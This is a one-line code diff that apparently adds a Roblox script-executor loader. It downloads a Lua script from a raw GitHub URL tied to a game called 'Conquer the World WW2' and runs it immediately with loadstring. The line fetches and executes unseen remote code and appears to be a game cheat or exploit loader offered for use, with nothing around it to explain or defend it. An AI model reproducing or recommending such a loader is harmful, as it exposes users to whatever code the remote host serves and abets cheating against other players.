@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/conquer-the-world-ww2-spam3-9ir895broc7mph.lua"))()
